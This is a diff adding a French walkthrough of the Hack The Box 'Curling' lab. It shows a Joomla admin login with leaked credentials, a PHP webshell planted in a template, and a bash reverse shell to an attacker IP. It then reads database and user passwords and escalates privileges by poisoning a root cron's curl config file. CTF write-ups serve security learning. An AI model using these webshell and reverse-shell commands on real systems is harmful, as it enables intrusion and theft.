@@ -537,22 +537,316 @@ Si aucun vhost distinct n’est identifié, ce fichier confirme l’absence de r
 
 ## Prise pied
 
-- Vecteur d'entrée confirmé (faille, creds, LFI/RFI, upload…).
-- Payloads utilisés (extraits pertinents).
-- Stabilisation du shell (pty, rlwrap, tmux…), preuve d'accès (`id`, `whoami`, `hostname`).
+L’énumération met en évidence un site web basé sur Joomla! 3.8.8 exposé sur le port HTTP.
+
+Les différents scans automatisés ne révèlent aucune vulnérabilité exploitable directement dans le cœur de Joomla ni dans des composants tiers.
+
+L’absence de vulnérabilité exploitable directement dans Joomla oriente donc l’analyse vers les contenus exposés par le site lui-même ainsi que vers les indices laissés dans l’application.
+
+### Analyse du code source
+
+L’inspection manuelle du code source de la page d’accueil révèle un commentaire HTML intéressant en fin de document :
+
+```html
+<!-- secret.txt -->
+```
+
+Tu récupères alors le fichier indiqué :
+
+```bash
+curl http://curling.htb/secret.txt
+```
+
+Résultat :
+
+```txt
+Q3VybGluZzIwMTgh
+```
+
+La chaîne utilise un format très courant en CTF et en développement web : elle ressemble fortement à une valeur encodée en Base64.
+
+Décodage :
+
+```bash
+echo 'Q3VybGluZzIwMTgh' | base64 -d
+```
+
+Résultat :
+
+```text
+Curling2018!
+```
+
+À ce stade, il est probable que cette valeur corresponde à un mot de passe.
+
+L’analyse du contenu de la page d’accueil permet également d’identifier un utilisateur potentiel :
+
+```html
+<p>- Floris</p>
+```
+
+Tu obtiens donc un premier couple utilisateur / mot de passe plausible :
+
+```text
+floris : Curling2018!
+```
+
+### Connexion à l’administration Joomla
+
+Le panneau d’administration Joomla est accessible via :
+
+```text
+http://curling.htb/administrator
+```
+
+Le couple précédent permet effectivement de s’authentifier avec succès.
+
+Une fois connecté à l’interface d’administration Joomla, tu cherches un moyen d’obtenir une exécution de code côté serveur.
+
+### Modification du template Joomla
+
+Le template actif utilisé par le site peut être identifié directement dans le code source HTML :
+
+```html
+/templates/protostar/
+```
+
+Depuis l’administration Joomla :
+
+```
+Extensions -> Templates -> Templates
+```
+
+tu ouvres alors le template :
+
+```
+Protostar
+```
+
+Puis le fichier :
+
+```
+index.php
+```
+
+Tu ajoutes temporairement le code suivant juste après :
+
+```
+defined('_JEXEC') or die;
+```
+
+L’objectif est d’ajouter un webshell minimal permettant d’exécuter des commandes système depuis le navigateur.
+
+Payload ajouté :
+
+```php
+if(isset($_GET['cmd'])){
+    system($_GET['cmd']);
+}
+```
+
+Ce code permet d’exécuter une commande système transmise via le paramètre GET `cmd`.
+
+### Validation de la RCE
+
+Tu vérifies ensuite l’exécution de commande :
+
+```bash
+curl "http://curling.htb/?cmd=id"
+```
+
+Résultat :
+
+```bash
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+L’exécution de commande est confirmée en tant que :
+
+```bash
+www-data
+```
+
+### Reverse shell
+
+Depuis ton Kali :
+
+```bash
+rlwrap -cAr nc -lvnp 4444
+```
+
+Puis via le navigateur :
+
+```url
+http://curling.htb/?cmd=bash -c 'bash -i >%26 /dev/tcp/10.10.14.X/4444 0>%261'
+```
+
+Tu obtiens alors un reverse shell interactif en tant que :
+
+```
+www-data
+```
+
+Avant de poursuivre la prise pied, il est recommandé de stabiliser le shell afin d’obtenir un terminal plus confortable et plus fiable.
+
+{{< recette "stabiliser-reverse-shell" >}}
+
+### Récupération des credentials MySQL
+
+Une fois sur la machine, tu consultes le fichier de configuration Joomla :
+
+```bash
+cat /var/www/html/configuration.php
+```
+
+Tu récupères notamment :
+
+```php
+public $user = 'floris';
+public $password = 'mYsQ!P4ssw0rd$yea!';
+```
+
+Le mot de passe MySQL ne fonctionne cependant pas pour une connexion SSH.
+
+L’exploration du home directory de `floris` révèle alors un fichier intéressant :
+
+```bash
+/home/floris/password_backup
+```
+
+### Analyse du fichier password_backup
+
+Le contenu de `password_backup` contient uniquement des caractères hexadécimaux (`0-9` et `a-f`) :
+
+```
+425a6839...
+```
+
+Ce format correspond à un dump hexadécimal : le fichier ne contient pas directement les données binaires, mais leur représentation sous forme de caractères hexadécimaux.
+
+La commande `xxd -r` permet alors de reconstruire le fichier binaire original à partir de ce dump hexadécimal.
+
+```bash
+xxd -r /home/floris/password_backup > /tmp/passwork
+```
+
+L’option `-r` signifie “reverse” : elle demande à `xxd` de faire l’opération inverse, c’est-à-dire de reconstruire les données binaires à partir du dump hexadécimal.
+
+Le fichier reconstruit n’est pas lisible directement.
+
+Tu commences donc par l’analyser avec la commande `file` afin d’identifier son format réel.
+
+`file` indique d’abord un fichier `bzip2` : tu le décompresses, mais le résultat n’est toujours pas lisible.
+
+Tu relances alors `file` sur le nouveau fichier.  
+
+Cette fois, le format détecté est `gzip` : tu le décompresses à nouveau.
+
+Le même scénario se répète ensuite plusieurs fois :
+
+\- analyse avec `file` ;
+\- identification du format ;
+\- décompression ;
+\- nouvelle analyse.
+
+Au fil des étapes, tu traverses plusieurs couches successives :
+
+```text
+hex -> bzip2 -> gzip -> bzip2 -> tar -> texte
+```
+
+Tu poursuis jusqu’à ce que `file` indique finalement :
+
+```
+ASCII text
+```
+
+Le contenu devient alors lisible et révèle le véritable mot de passe utilisateur :
+
+```
+5d<wdCbdZu)|hChXll
+```
+
+> **Note :** lorsqu’un fichier contient plusieurs couches de compression ou d’archives imbriquées, il peut être pratique d’automatiser la détection et la décompression avec une boucle Bash.
+>
+> Tu peux par exemple demander à ChatGPT de générer ce type de boucle automatiquement à partir du résultat de la commande `file`.
+>
+> ```bash
+> cp /home/floris/password_backup /tmp/passwork
+> cd /tmp
+> xxd -r passwork > passwork.bin
+> mv passwork.bin passwork
+> 
+> while true; do
+>     file passwork
+> 
+>     if file passwork | grep -q "bzip2 compressed"; then
+>         mv passwork passwork.bz2
+>         bunzip2 passwork.bz2
+> 
+>     elif file passwork | grep -q "gzip compressed"; then
+>         mv passwork passwork.gz
+>         gunzip passwork.gz
+> 
+>     elif file passwork | grep -q "tar archive"; then
+>         mkdir -p pass_extract
+>         tar -xf passwork -C pass_extract
+>         find pass_extract -type f -exec cp {} passwork \;
+>         rm -rf pass_extract
+> 
+>     elif file passwork | grep -q "ASCII text"; then
+>         cat passwork
+>         break
+> 
+>     else
+>         echo "[!] Type non géré"
+>         break
+>     fi
+> done
+> ```
+
+### Connexion SSH
+
+Tu peux alors te connecter proprement en SSH :
+
+```bash
+ssh floris@curling.htb
+```
+
+Mot de passe :
+
+```
+5d<wdCbdZu)|hChXll
+```
+
+La prise de pied est maintenant complète avec un accès shell stable en tant qu’utilisateur :
+
+```
+floris
+```
 
 ---
 
 ## Escalade de privilèges
 
-{{< escalade-intro user="ssh_user" >}}
+{{< escalade-intro user="floris" >}}
 
 ### Sudo -l
 Tu commences toujours par vérifier les droits sudo :
 
+
+
+```bash
+floris@curling:/dev/shm$ sudo -l
+[sudo] password for floris: 
+Sorry, user floris may not run sudo on curling.
+```
+
+
+
 ### Exploration du contexte utilisateur
 
-Avant d’aller plus loin, tu vérifies le contexte dans lequel tu te trouves :
+Avant d’aller plus loin, tu vérifies rapidement le contexte de la machine :
 
 ```bash
 whoami
@@ -564,97 +858,91 @@ hostname
 
 Résultat :
 
-### Recherche de binaires SUID
-Tu poursuis l’énumération en recherchant les **binaires SUID**, qui permettent parfois d’exécuter certaines commandes avec les privilèges de leur propriétaire.
-
 ```bash
-find / -perm -4000 -type f 2>/dev/null
+floris@curling:/dev/shm$ whoami
+floris
+floris@curling:/dev/shm$ id
+uid=1000(floris) gid=1004(floris) groups=1004(floris)
+floris@curling:/dev/shm$ pwd
+/dev/shm
+floris@curling:/dev/shm$ uname -a
+Linux curling 4.15.0-156-generic #163-Ubuntu SMP Thu Aug 19 23:31:58 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
+floris@curling:/dev/shm$ hostname
+curling
 ```
 
-La liste obtenue ne contient que des binaires système classiques tels que :
 
-```texte
-/usr/bin/passwd
-/usr/bin/chsh
-/usr/bin/chfn
-/usr/bin/sudo
-/usr/bin/newgrp
-...
-```
-
-Ces binaires sont classiques sur un système Linux et sont généralement présents par défaut.
-Tu n’identifies aucun binaire inhabituel ou directement exploitable.
-
-### Analyse des Linux capabilities
-
-Tu vérifies ensuite si certains binaires disposent de **capabilities Linux**, qui permettent à un programme d’effectuer certaines actions privilégiées sans être exécuté en root ou via un binaire SUID.
-
-La vérification se fait avec la commande suivante :
-
-```bash
-getcap -r / 2>/dev/null
-```
-
-Ici, tu ne trouves aucune capability inhabituelle ni aucun binaire exploitable.
-
-### Vérification des SUID avec suid3num.py
-
-Pour compléter l’analyse des binaires SUID, tu utilises l’outil suid3num.py, qui permet d’identifier rapidement :
-
-les binaires SUID intéressants
-leur présence éventuelle dans GTFOBins
-
-Tu le télécharges et l’exécutes depuis un répertoire en mémoire (/dev/shm) :
-
-```bash
-cd /dev/shm
-wget http://10.10.x.x:8000/suid3num.py
-python3 suid3num.py
-```
-L’outil confirme que :
-
-- tous les binaires SUID présents sont standards
-- aucun binaire personnalisé n’est identifié
-- aucun binaire exploitable via GTFOBins n’est détecté
-  
-
-Cette vérification confirme que la piste des SUID ne mène à rien dans ce cas précis.
-
-### Inspection des tâches cron
-Tu vérifies ensuite les **tâches planifiées (cron)**, car certains scripts exécutés automatiquement par le système peuvent être modifiables par un utilisateur et permettre une élévation de privilèges.
-
-Les crons système peuvent être consultés avec :
-
-```bash
-cat /etc/crontab
-```
-
-### Analyse des services locaux
-Tu vérifies ensuite les **services en cours d’exécution**, ce qui permet parfois d’identifier une application vulnérable ou un service mal configuré.
-
-```
-netstat -tulpn
-```
 
 ### pspy64
-Tu lances également pspy64 dans une deuxième session SSH afin d’observer en temps réel les processus exécutés sur la machine, notamment ceux lancés par root.
 
-Tu le télécharges et l’exécutes depuis un répertoire persistant (/var/tmp) :
+Comme suggéré dans la recette {{< recette "privilege-escalation-linux" >}}, tu lances également pspy64 dans une deuxième session SSH afin d’observer en temps réel les processus exécutés sur la machine, notamment ceux lancés par root `UID=0`.
 
-cd /var/tmp
-wget http://10.10.x.x:8000/pspy64
-chmod +x pspy64
-./pspy64
+L’énumération locale révèle rapidement une tâche cron intéressante exécutée par `root` :
 
-L’objectif est d’identifier des tâches exécutées automatiquement par root pouvant être exploitables.
+```bash
+[date] 14:10:01 CMD: UID=0     PID=2535   | /bin/sh -c curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report 
+[date] 14:10:01 CMD: UID=0     PID=2534   | /bin/sh -c sleep 1; cat /root/default.txt > /home/floris/admin-area/input 
+```
 
-Dans ce cas précis, aucun processus exploitable n’apparaît dans cette deuxième session, même en redémarrant la première session SSH.
+La commande observée est :
 
-### Conclusion de l’énumération manuelle
+```bash
+curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report
+```
 
-### Analyse avec linpeas.sh
-Dans **LinPEAS**, les vulnérabilités potentielles sont classées et surlignées par couleur.
-![Légende des couleurs de LinPEAS indiquant le niveau de criticité des vulnérabilités](/images/linpeas-legend.png)
+Le paramètre `-K` indique que `curl` charge ses options depuis un fichier de configuration externe.
+
+L’analyse montre que ce fichier est situé dans le répertoire personnel de l’utilisateur `floris` :
+
+```bash
+/home/floris/admin-area/input
+```
+
+Cela signifie qu’un processus exécuté avec les privilèges `root` utilise un fichier contrôlable par un utilisateur non privilégié.
+
+Quelques secondes plus tard, un second cron réinitialise automatiquement ce fichier avec :
+
+```bash
+cat /root/default.txt > /home/floris/admin-area/input
+```
+
+Le mécanisme fonctionne donc en deux étapes :
+
+1. `root` exécute `curl -K` avec le contenu du fichier `input`
+2. le fichier est ensuite restauré à son état par défaut
+
+Cette fenêtre est suffisante pour injecter temporairement une configuration arbitraire dans `input`.
+
+Comme `curl` accepte également les URLs locales via le protocole `file://`, il devient possible de demander à `root` de lire directement des fichiers accessibles uniquement à l’utilisateur privilégié.
+
+Le fichier `input` est remplacé par :
+
+```bash
+url = "file:///root/root.txt"
+output = "/dev/shm/root.txt"
+```
+
+La directive `output` du fichier de configuration est également interprétée par `curl`, ce qui permet ici d’écrire directement le contenu dans `/dev/shm/root.txt`.
+
+```bash
+cat > /home/floris/admin-area/input << 'EOF'
+url = "file:///root/root.txt"
+output = "/dev/shm/root.txt"
+EOF
+```
+
+Puis, au prochain passage du cron, `curl` est exécuté par `root` et copie le contenu de `/root/root.txt` vers `/dev/shm/root.txt`.
+
+Il ne reste alors plus qu’à lire le fichier généré :
+
+```bash
+cat /dev/shm/root.txt
+8935xxxxxxxxxxxxxxxxxxxxxxxxxxxef69
+```
+
+Cette escalade repose donc sur une mauvaise séparation des privilèges : un processus root exécute `curl` à partir d’un fichier de configuration modifiable par un utilisateur non privilégié.
+
+
 
 ---
 
